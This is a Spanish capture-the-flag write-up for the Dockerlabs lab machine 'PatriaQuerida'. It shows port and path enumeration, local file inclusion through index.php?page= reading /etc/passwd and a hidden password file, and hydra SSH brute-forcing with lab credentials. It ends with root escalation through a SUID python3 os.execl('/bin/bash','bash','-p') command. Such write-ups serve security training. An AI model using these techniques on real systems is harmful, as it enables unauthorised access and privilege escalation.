
# Writeup Template: Maquina `[ PatriaQuerida ]`

- Tags: #PatriaQuerida
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PatriaQuerida](https://mega.nz/file/vFVAVaDC#GCHyxwobUhc_WodvbdeOEdjfjtotxH4WKW3TzOB3P9E)  Laboratorio para aprender sobre seguridad en entornos básicos.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x patriaquerida.zip
sudo bash auto_deploy.sh patriaquerida.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((UbuntuFocal))
```
---

## Enumeracion de [Servicio  Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 110]
```

Revisando esta url:
```bash
http://172.17.0.2/index.php
```

Realizaremos un ataque de **fuzzing** para determinar si esta ejecutando algun parametro en la consulta **php**
```bash
wfuzz -c --hw 12 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/index.php?FUZZ=test"
```

Tenemos un parametro descubierto que veremos si es vulnerable:
```bash
000000099:   200        0 L      0 W        0 Ch        "page" 
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Probaremos a listar el contenido del archivo: **( /etc/passawd )** Si logramos derivarlo a un **LFI** podriamos ver el contenido del archivo
### Ejecucion del Ataque
```bash
# Comandos para explotación
http://172.17.0.2/index.php?page=/etc/passwd
```

Tenemos dos usuarios en el sistema:
```bash
pinguino:x:1000:1000::/home/pinguino:/bin/bash
mario:x:1001:1001::/home/mario:/bin/bash
```

Si recordamos tenemos esta leyenda donde posiblemente tenemos contrasenas de usuarios:
```bash
Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
```

Revisando ese archivo oculto:
```bash
view-source:http://172.17.0.2/index.php?page=.hidden_pass
```

Tenemos una contrasena la cual podemos intentar verificar con un ataque de fuerza bruta con hydra:
```bash
balu # Password filtrada
```

Una ves creado nuestro diccionario con los dos usuarios del sistema, Procedemos a realizar un ataque de fuerza bruta;
```bash
hydra -L users.txt -p balu ssh://172.17.0.2
```

Tenemos las credenciales correctas:
```bash
[22][ssh] host: 172.17.0.2   login: pinguino   password: balu
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh pinguino@172.17.0.2 # ( balu ) 
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
ls -la
```

**Hallazgos Clave:**
- Binario con privilegios: `[ nota_mario.txt ]` # Tenemos una nota con la contrasena del usuario **mario**
- Credenciales de usuario: `[ pinguino ]:[ balu ]`

### Explotacion de Privilegios

###### Usuario `[ Pinguino ]`:

```bash
# Comando para escalar al usuario: ( mario )
su mario # ( invitaacachopo )
```

###### Usuario `[ Mario ]`:
```bash
find / -perm -4000 2>/dev/null
```

Tenemos el binario de **python3** que podemos explotar:
```bash
/usr/bin/python3.8
```

Explotando el binario:
```bash
# Comando para escalar al usuario: ( root )
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.0# whoami
root
```

---
## Lecciones Aprendidas
1. Aprendimos a explotar una vulnerabilidad **LFI**
2. Aprendimos a obtener contrasenas ocultas atraves de un **LFI**
3. Aprendimos a explotar el binario de **python3** para obtener una **bash** como **root**

## Recomendaciones de Seguridad
- No almacenar contrasenas en archivos ocultos
- Evitar el binario de **python3** con privilegios **SUID**